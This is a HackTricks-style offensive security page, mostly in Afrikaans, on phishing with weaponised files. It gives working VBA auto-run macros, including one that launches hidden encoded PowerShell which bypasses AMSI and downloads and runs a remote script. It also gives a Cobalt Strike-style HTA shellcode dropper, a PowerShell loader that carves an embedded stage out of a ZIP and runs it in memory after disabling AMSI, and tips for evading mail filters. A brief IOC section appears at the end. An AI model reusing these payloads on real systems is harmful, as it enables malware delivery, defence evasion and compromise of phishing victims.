# Phishing Lêers & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office Dokumente

Microsoft Word voer lêerdata-validering uit voordat 'n lêer oopgemaak word. Data-validering word uitgevoer in die vorm van identifisering van datastrukture, teen die OfficeOpenXML-standaard. As enige fout voorkom tydens die identifisering van die datastruktuur, sal die lêer wat ontleed word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds die vermoë om macros uit te voer te behou.\
Byvoorbeeld, 'n RTF-lêer ondersteun nie macros nie, volgens ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en sal in staat wees om macros uit te voer.\
Dieselfde interne strukture en meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint etc.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sekere Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na 'n afgeleë sjabloon verwys (File –Options –Add-ins –Manage: Templates –Go) wat macros bevat, kan ook macros “execute”.

### Eksterne Beeldlading

Gaan na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, en **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Dit is moontlik om macros te gebruik om arbitrêre code vanaf die dokument uit te voer.

#### Autoload-funksies

Hoe algemener dit is, hoe meer waarskynlik is dit dat AV dit sal opspoor.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector oopmaak. Klik **Inspect** en dan **Remove All** langs **Document Properties and Personal Information**.

#### Doc Extension

Wanneer klaar, kies die **Save as type** dropdown, verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
Doen dit omdat jy **nie makro's binne 'n `.docx` kan stoor nie** en daar 'n **stigma** bestaan rondom die makro-geaktiveerde **`.docm`** uitbreiding (bv. die miniatuur-ikoon het 'n groot `!` en sommige web-/e-pos-hekke blokkeer hulle heeltemal). Daarom is hierdie **erfenis `.doc` uitbreiding die beste kompromis**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Afdwing van NTLM Authentication

Daar is verskeie maniere om **NTLM authentication "op afstand" af te dwing**, byvoorbeeld jy kan **onsigbare beelde** by e-posse of HTML voeg wat die gebruiker sal toegang (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **authentication** sal **trigger** net deur **die gids te open.**

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moet nie vergeet dat jy nie net die hash of die authentication kan steel nie, maar ook **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Baie doeltreffende veldtogte lewer 'n ZIP wat twee legitieme skyn-dokumente (PDF/DOCX) en 'n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell loader in die rou bytes van die ZIP gestoor word na 'n unieke merk, en die .lnk kerf dit uit en hardloop dit heeltemal in geheue.

Tipiese vloei geïmplementeer deur die .lnk PowerShell one-liner:

1) Vind die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, en die ouergids van die huidige werkgids.
2) Lees die ZIP-bytes en vind 'n hardgekodeerde merk (bv. xFIQCV). Alles ná die merk is die ingeslote PowerShell payload.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en open die skyn-.docx om legitimiteit te skep.
4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate die volgende stage (bv. verwyder alle # karakters) en voer dit in geheue uit.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Aantekeninge
- Aflewering misbruik dikwels betroubare PaaS-subdomeine (e.g., *.herokuapp.com) en kan payloads beperk (bedien onskadelike ZIP-lêers gebaseer op IP/UA).
- Die volgende fase ontsleutel dikwels base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyfartefakte te minimaliseer.

Persistensie wat in dieselfde ketting gebruik word
- COM TypeLib hijacking of the Microsoft Web Browser control sodat IE/Explorer of enige app wat dit embed die payload outomaties herbegin. Sien besonderhede en gereed-vir-gebruik opdragte hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Opsporing/IOCs
- ZIP-lêers wat die ASCII-merkerstring (e.g., xFIQCV) bevat wat aan die argiefdata aangeheg is.
- .lnk wat ouer- en gebruiker-lêergidse deurloop om die ZIP te vind en 'n lokdokument oop te maak.
- AMSI-manipulasie via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langdurige sake-drade wat eindig met skakels gehost op vertroude PaaS-domeine.

## Verwysings

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
